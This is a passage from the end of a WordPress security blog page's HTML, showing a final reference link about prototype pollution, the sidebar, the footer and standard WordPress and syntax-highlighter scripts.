<li><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18" target="_blank" rel="noopener" title="">https://github.com/HoLyVieR/prototype-pollution-nsec18</a></li>
</ul>
																		<!-- Start Tags -->
						<div class="tags"></div>
						<!-- End Tags -->
											</div><!-- End Content -->
						
					<!-- Start Related Posts -->
													<!-- End Related Posts -->
								  
								  
								
<!-- You can start editing here. -->
									</div>
						</div>
									</article>
				<!-- End Article -->
				<!-- Start Sidebar -->
				
<aside class="sidebar c-4-12">
	<div id="sidebars" class="sidebar">
		<div class="sidebar_list">
			<div id="block-2" class="widget widget_block widget_search"><form role="search" method="get" action="https://blog.abdulrah33m.com/" class="wp-block-search__button-inside wp-block-search__icon-button wp-block-search"    ><label class="wp-block-search__label screen-reader-text" for="wp-block-search__input-1" >Search</label><div class="wp-block-search__inside-wrapper"  style="width: 305px"><input class="wp-block-search__input" id="wp-block-search__input-1" placeholder="" value="" type="search" name="s" required /><button aria-label="Search" class="wp-block-search__button has-icon wp-element-button" type="submit" ><svg class="search-icon" viewBox="0 0 24 24" width="24" height="24">
					<path d="M13 5c-3.3 0-6 2.7-6 6 0 1.4.5 2.7 1.3 3.7l-3.8 3.8 1.1 1.1 3.8-3.8c1 .8 2.3 1.3 3.7 1.3 3.3 0 6-2.7 6-6S16.3 5 13 5zm0 10.5c-2.5 0-4.5-2-4.5-4.5s2-4.5 4.5-4.5 4.5 2 4.5 4.5-2 4.5-4.5 4.5z"></path>
				</svg></button></div></form></div><div id="block-3" class="widget widget_block"><div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading">Recent Posts</h2><ul class="wp-block-latest-posts__list wp-block-latest-posts"><li><a class="wp-block-latest-posts__post-title" href="https://blog.abdulrah33m.com/prototype-pollution-in-python/">Prototype Pollution in Python</a></li>
</ul></div></div></div><div id="block-5" class="widget widget_block"><div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading">Archives</h2><ul class="wp-block-archives-list wp-block-archives">	<li><a href='https://blog.abdulrah33m.com/2023/01/'>January 2023</a></li>
</ul></div></div></div><div id="block-6" class="widget widget_block"><div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading">Categories</h2><ul class="wp-block-categories-list wp-block-categories">	<li class="cat-item cat-item-9"><a href="https://blog.abdulrah33m.com/category/research/">Research</a>
</li>
</ul></div></div></div><div id="block-11" class="widget widget_block">
<div class="wp-block-columns is-layout-flex wp-container-core-columns-is-layout-9d6595d7 wp-block-columns-is-layout-flex">
<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow">
<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
<ul class="wp-block-social-links is-style-logos-only is-layout-flex wp-block-social-links-is-layout-flex"><li class="wp-social-link wp-social-link-twitter  wp-block-social-link"><a href="https://twitter.com/abdulrah33mk" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M22.23,5.924c-0.736,0.326-1.527,0.547-2.357,0.646c0.847-0.508,1.498-1.312,1.804-2.27 c-0.793,0.47-1.671,0.812-2.606,0.996C18.324,4.498,17.257,4,16.077,4c-2.266,0-4.103,1.837-4.103,4.103 c0,0.322,0.036,0.635,0.106,0.935C8.67,8.867,5.647,7.234,3.623,4.751C3.27,5.357,3.067,6.062,3.067,6.814 c0,1.424,0.724,2.679,1.825,3.415c-0.673-0.021-1.305-0.206-1.859-0.513c0,0.017,0,0.034,0,0.052c0,1.988,1.414,3.647,3.292,4.023 c-0.344,0.094-0.707,0.144-1.081,0.144c-0.264,0-0.521-0.026-0.772-0.074c0.522,1.63,2.038,2.816,3.833,2.85 c-1.404,1.1-3.174,1.756-5.096,1.756c-0.331,0-0.658-0.019-0.979-0.057c1.816,1.164,3.973,1.843,6.29,1.843 c7.547,0,11.675-6.252,11.675-11.675c0-0.178-0.004-0.355-0.012-0.531C20.985,7.47,21.68,6.747,22.23,5.924z"></path></svg><span class="wp-block-social-link-label screen-reader-text">Twitter</span></a></li>

<li class="wp-social-link wp-social-link-github  wp-block-social-link"><a href="https://github.com/abdulrah33m" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M12,2C6.477,2,2,6.477,2,12c0,4.419,2.865,8.166,6.839,9.489c0.5,0.09,0.682-0.218,0.682-0.484 c0-0.236-0.009-0.866-0.014-1.699c-2.782,0.602-3.369-1.34-3.369-1.34c-0.455-1.157-1.11-1.465-1.11-1.465 c-0.909-0.62,0.069-0.608,0.069-0.608c1.004,0.071,1.532,1.03,1.532,1.03c0.891,1.529,2.341,1.089,2.91,0.833 c0.091-0.647,0.349-1.086,0.635-1.337c-2.22-0.251-4.555-1.111-4.555-4.943c0-1.091,0.39-1.984,1.03-2.682 C6.546,8.54,6.202,7.524,6.746,6.148c0,0,0.84-0.269,2.75,1.025C10.295,6.95,11.15,6.84,12,6.836 c0.85,0.004,1.705,0.114,2.504,0.336c1.909-1.294,2.748-1.025,2.748-1.025c0.546,1.376,0.202,2.394,0.1,2.646 c0.64,0.699,1.026,1.591,1.026,2.682c0,3.841-2.337,4.687-4.565,4.935c0.359,0.307,0.679,0.917,0.679,1.852 c0,1.335-0.012,2.415-0.012,2.741c0,0.269,0.18,0.579,0.688,0.481C19.138,20.161,22,16.416,22,12C22,6.477,17.523,2,12,2z"></path></svg><span class="wp-block-social-link-label screen-reader-text">GitHub</span></a></li>

<li class="wp-social-link wp-social-link-linkedin  wp-block-social-link"><a href="https://linkedin.com/in/abdulrah33m" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M19.7,3H4.3C3.582,3,3,3.582,3,4.3v15.4C3,20.418,3.582,21,4.3,21h15.4c0.718,0,1.3-0.582,1.3-1.3V4.3 C21,3.582,20.418,3,19.7,3z M8.339,18.338H5.667v-8.59h2.672V18.338z M7.004,8.574c-0.857,0-1.549-0.694-1.549-1.548 c0-0.855,0.691-1.548,1.549-1.548c0.854,0,1.547,0.694,1.547,1.548C8.551,7.881,7.858,8.574,7.004,8.574z M18.339,18.338h-2.669 v-4.177c0-0.996-0.017-2.278-1.387-2.278c-1.389,0-1.601,1.086-1.601,2.206v4.249h-2.667v-8.59h2.559v1.174h0.037 c0.356-0.675,1.227-1.387,2.526-1.387c2.703,0,3.203,1.779,3.203,4.092V18.338z"></path></svg><span class="wp-block-social-link-label screen-reader-text">LinkedIn</span></a></li></ul>
</div></div>
</div></div>
</div>
</div>
</div>		</div>
	</div><!--sidebars-->
</aside>				<!-- End Sidebar -->
			</div>
		</div>
		<footer id="site-footer" role="contentinfo">
	    <!--start copyrights-->
    <div class="copyrights">
      <div class="container">
        <div class="row" id="copyright-note">
          <span>
            &copy; 2026 Abdulrah33m&#039;s Blog <span class="footer-info-right">
               | WordPress Theme by <a href="https://superbthemes.com/" rel="nofollow noopener"> Superb WordPress Themes</a>          </span>
              <div class="top">
                <a href="#top" class="toplink">Back to Top &uarr;</a>
              </div>
            </div>
          </div>
        </div>
        <!--end copyrights-->
      </footer><!-- #site-footer -->
<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/darkly-magazine/*","/wp-content/themes/feather-magazine/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
<script type="text/javascript" src="https://blog.abdulrah33m.com/wp-content/themes/feather-magazine/js/customscripts.js?ver=6.9.4" id="feather-magazine-customscripts-js"></script>
<script type="text/javascript" src="https://blog.abdulrah33m.com/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=FKif601bnx4CR1H" id="enlighterjs-js"></script>
<script type="text/javascript" id="enlighterjs-js-after">
/* <![CDATA[ */
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"scroll","linenumbers":true,"theme":"enlighter","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
//# sourceURL=enlighterjs-js-after
/* ]]> */
</script>
<script id="wp-emoji-settings" type="application/json">
{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://blog.abdulrah33m.com/wp-includes/js/wp-emoji-release.min.js?ver=6.9.4"}}
</script>
<script type="module">
/* <![CDATA[ */
/*! This file is auto-generated */
const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
//# sourceURL=https://blog.abdulrah33m.com/wp-includes/js/wp-emoji-loader.min.js
/* ]]> */
</script>

</body>
</html>


<!-- Page cached by LiteSpeed Cache 7.8.1 on 2026-04-24 13:18:19 -->